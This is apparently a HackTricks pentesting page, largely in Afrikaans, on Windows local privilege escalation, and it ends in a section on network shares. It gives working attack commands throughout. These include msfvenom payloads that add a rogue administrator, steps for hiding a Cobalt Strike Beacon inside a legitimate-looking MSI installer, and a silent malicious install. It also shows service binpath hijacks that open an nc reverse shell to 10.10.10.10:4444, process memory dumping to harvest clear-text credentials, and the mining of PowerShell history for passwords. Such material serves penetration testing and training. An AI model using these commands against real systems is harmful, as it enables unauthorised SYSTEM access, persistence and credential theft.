# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Inleidende Windows-teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Sekuriteitskontroles

Daar is verskillende dinge in Windows wat jou kan **prevent you from enumerating the system**, uitvoerbare lêers kan blokkeer of selfs jou aktiwiteite kan **detect**. Jy moet die volgende **page** **read** en al hierdie **defenses** **mechanisms** **enumerate** voordat jy met die privilege escalation-ondersoek begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Stelselinligting

### Version info enumeration

Check if the Windows version has any known vulnerability (check also the patches applied).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe-eksploite

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede op te spoor. Hierdie databasis het meer as 4,700 sekuriteitskwesbaarhede, wat die **massive attack surface** wat 'n Windows-omgewing bied, toon.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Lokaal met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos van exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Is enige credential/Juicy info in die env variables gestoor?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-transkripsielêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell pipeline-uitvoerings word aangeteken, insluitend uitgevoerde kommando's, kommando-aanroepe, en dele van skripte. Volledige uitvoeringsbesonderhede en uitsetresultate mag egter nie altyd vasgelê word nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files" afdeling van die dokumentasie, en kies **"Module Logging"** eerder as **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 events van PowersShell logs te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

ŉ volledige register van aktiwiteite en die volle inhoud van die uitvoering van die skrip word vasgelê, wat verseker dat elke kodeblok gedokumenteer word soos dit uitgevoer word. Hierdie proses bewaar 'n omvattende ouditspoor van elke aktiwiteit, wat waardevol is vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteite tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gebeure vir die Script Block kan in die Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeure te sien, kan jy die volgende gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Skywe
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie via http**S** versoek word nie, maar via http.

Begin deur te kontroleer of die netwerk 'n nie-SSL WSUS update gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy 'n antwoord kry soos een van hierdie:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan is dit **uitbruikbaar.** As die laaste registerwaarde gelyk is aan `0`, sal die WSUS-inskrywing geïgnoreer word.

Om hierdie kwesbaarhede uit te buit kan jy gereedskap soos: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik — dit is MiTM-gewapende exploit-skripte om 'fake' opdaterings in nie-SSL WSUS-verkeer in te spuit.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies is dit die fout wat hierdie probleem uitbuit:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Jy kan hierdie kwesbaarheid uitbuit met die hulpmiddel [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (sodra dit vrygestel is).

## Derdeparty Auto-Updaters en Agent IPC (local privesc)

Baie enterprise agents openbaar 'n localhost IPC-oppervlak en 'n bevoorregte opdateringskanaal. As inskrywing gedwing kan word na 'n aanvaler-bediener en die updater 'n rogue root CA of swak ondertekenaarkontroles vertrou, kan 'n plaaslike gebruiker 'n kwaadwillige MSI lewer wat die SYSTEM-diens installeer. Sien 'n gegeneraliseerde tegniek (gebaseer op die Netskope stAgentSvc chain – CVE-2025-0309) hier:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Daar bestaan 'n **local privilege escalation** kwesbaarheid in Windows **domain**-omgewings onder spesifieke voorwaardes. Hierdie voorwaardes sluit omgewings in waar **LDAP signing is not enforced,** gebruikers self-regte het wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD)** te konfigureer, en die vermoë vir gebruikers om rekenaars binne die domein te skep. Dit is belangrik om daarop te let dat hierdie **vereistes** met **default settings** nagekom word.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** hierdie 2 registers is **enabled** (waarde is **0x1**), kan gebruikers van enige bevoegdheid `*.msi`-lêers **install** (uitvoer) as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI` opdrag van PowerUP om binne die huidige gids 'n Windows MSI-binêre te skep om privilegies te eskaleer. Hierdie script skryf 'n voorgekompileerde MSI-installer uit wat vra vir 'n gebruiker/groep toevoeging (dus sal jy GUI-toegang benodig):
```
Write-UserAddMSI
```
Voer net die gegenereerde binêre uit om privileges te eskaleer.

### MSI Wrapper

Lees hierdie tutorial om te leer hoe om 'n MSI wrapper te skep met hierdie tools. Neem kennis dat jy 'n "**.bat**" lêer kan wrap as jy **net** wil **uitvoer** **opdragreëls**

{{#ref}}
msi-wrapper.md
{{#endref}}

### Skep MSI met WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Skep MSI met Visual Studio

- **Genereer** met Cobalt Strike of Metasploit 'n **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekkassie. Kies die **Setup Wizard** projek en klik **Next**.
- Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Klik aanhoudend op **Next** totdat jy by stap 3 van 4 kom (choose files to include). Klik **Add** en kies die Beacon payload wat jy so pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc** projek in die **Solution Explorer** en in die **Properties**, verander **TargetPlatform** van **x86** na **x64**.
- Daar is ander eienskappe wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer eg kan laat voorkom.
- Regsklik die projek en kies **View > Custom Actions**.
- Regsklik **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe** lêer en klik **OK**. Dit verseker dat die beacon payload uitgevoer word sodra die installer uitgevoer word.
- Onder die **Custom Action Properties**, verander **Run64Bit** na **True**.
- Laastens, **build** dit.
- Indien die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` verskyn, maak seker jy stel die platform op x64.

### MSI Installasie

Om die **installasie** van die kwaadwillige `.msi` file in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid te benut kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Detektore

### Oudit-instellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy aandag skenk
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding is interessant om te weet waar die logs naartoe gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde**, en verseker dat elke wagwoord **uniek, gerandomiseer en gereeld opgedateer** word op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig in Active Directory gestoor en kan slegs deur gebruikers geraadpleeg word wat voldoende magtiging via ACLs ontvang het, wat hulle in staat stel om plaaslike admin-wagwoorde te besigtig indien gemagtig.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

As dit aktief is, word **plain-text wagwoorde in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-beskerming

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Plaaslike Sekuriteitsowerheid (LSA) ingevoer om pogings deur onbetroubare prosesse te **blokkeer** om **sy geheue te lees** of kode te injekteer, en sodoende die stelsel verder te beveilig.\
[**Meer inligting oor LSA-beskerming hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is ingevoer in **Windows 10**. Die doel daarvan is om die credentials wat op 'n toestel gestoor word, teen bedreigings soos pass-the-hash attacks te beskerm.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** word geverifieer deur die **Local Security Authority** (LSA) en gebruik deur bedryfstelselkomponente. Wanneer 'n gebruiker se logon data deur 'n geregistreerde security package geverifieer word, word domain credentials vir die gebruiker gewoonlik opgestel.\\
[**Meer inligting oor Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumereer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waarvan jy deel uitmaak interessante toestemmings het.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy **deel is van 'n bevoorregte groep, kan jy dalk escalate privileges**. Lees oor bevoorregte groepe en hoe om dit te misbruik om escalate privileges hier:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Leer meer** oor wat 'n **token** is op hierdie blad: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende blad om te **leer oor interessante tokens** en hoe om dit te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Ingelogde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuismappe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende Prosesse

### Lêer- en gids toestemmings

Eerstens, wanneer jy die prosesse lys, **kyk vir wagwoorde in die command line van die proses**.\
Kyk of jy **'n lopende binary kan oorskryf** of jy skryfregte op die binary-gids het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) te benut:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om bevoegdhede te eskaleer](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die toestemmings van die proses-binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer die permissies van die vouers van die proses se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Jy kan 'n memory dump van 'n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP bevat die **credentials in clear text in memory**; probeer om die memory te dump en lees die credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-apps

**Toepassings wat as SYSTEM uitgevoer word, kan 'n gebruiker toelaat om 'n CMD te begin, of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek na "command prompt", klik op "Click to open Command Prompt"

## Dienste

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissies

Jy kan **sc** gebruik om inligting oor 'n diens te kry.
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binaire **accesschk** van _Sysinternals_ te hê om die vereiste privilegievlak vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_Stelselfout 1058 het voorgekom._\
_Die diens kan nie begin word nie, óf omdat dit gedeaktiveer is, óf omdat daar geen geaktiveerde toestelle daarmee geassosieer is nie._

Jy kan dit aktiveer met
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die service upnphost afhanklik is van SSDPSRV om te werk (vir XP SP1)**

**Nog 'n workaround vir hierdie probleem is om die volgende te laat loop:**
```
sc.exe config usosvc start= auto
```
### **Wysig die diens se binêre uitvoerbare pad**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens besit, is dit moontlik om die diens se uitvoerbare binêre lêer te wysig. Om te wysig en **sc** uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegies kan verhoog word deur verskeie toestemmings:

- **SERVICE_CHANGE_CONFIG**: Laat herkonfigurasie van die service binary toe.
- **WRITE_DAC**: Stel toestemming-herkonfigurasie in, wat lei tot die vermoë om service-konfigurasies te verander.
- **WRITE_OWNER**: Maak eienaarskapverkryging en toestemming-herkonfigurasie moontlik.
- **GENERIC_WRITE**: Erf die vermoë om service-konfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om service-konfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan die _exploit/windows/local/service_permissions_ gebruik word.

### Swak permissies op service binaries

**Kontroleer of jy die binary wat deur 'n service uitgevoer word, kan wysig** of as jy **skryfregte op die vouer** het waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur 'n service uitgevoer word kry met **wmic** (nie in system32 nie) en jou toestemmings nagaan met **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Diensregister: wysig toestemmings

Jy moet nagaan of jy enige diensregister kan wysig.\
Jy kan jou **toestemmings** oor 'n **diensregister** **nagaan** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Dit moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings besit. Indien wel, kan die binary wat deur die service uitgevoer word, verander word.

Om die Path van die uitgevoerde binary te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dienste-register AppendData/AddSubdirectory toestemmings

As jy hierdie toestemming oor 'n register het, beteken dit dat **jy sub-registrasies vanaf hierdie een kan skep**. In die geval van Windows-dienste is dit **voldoende om ewekansige kode uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Dienspade sonder aanhalingstekens

As die pad na 'n uitvoerbare lêer nie binne aanhalingstekens is nie, sal Windows probeer om elke deel voor 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle dienspaaie sonder aanhalingstekens, uitgesluit dié wat by ingeboude Windows-dienste behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid opspoor en uitbuit** met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n service binary met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word indien 'n diens faal. Hierdie funksie kan gekonfigureer word om na 'n binary te verwys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede is beskikbaar in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Toepassings

### Geïnstalleerde toepassings

Kontroleer die **permissions of the binaries** (miskien kan jy een overwrite en escalate privileges) en die **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryfregte

Kontroleer of jy 'n konfigurasielêer kan wysig om 'n spesiale lêer te lees, of jy 'n binêre lêer kan wysig wat later deur 'n Administrator-rekening (schedtasks) uitgevoer gaan word.

'n Manier om swak map-/lêertoestemmings in die stelsel te vind, is om te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Voer by opstart uit

**Kontroleer of jy 'n registry of binary kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Soek na moontlike **derdeparty vreemde/kwetsbare** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n arbitrary kernel read/write primitive blootstel (algemeen in swak ontwerpte IOCTL handlers), kan jy escalate deur 'n SYSTEM token direk uit kernel memory te steel. Sien die stap‑vir‑stap tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

As jy **write permissions inside a folder present on PATH** het, kan jy moontlik 'n DLL wat deur 'n proses gelaai is hijack en **escalate privileges**.

Kontroleer permissies van alle gidse in PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Netwerk

### Gedeelde vouers
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
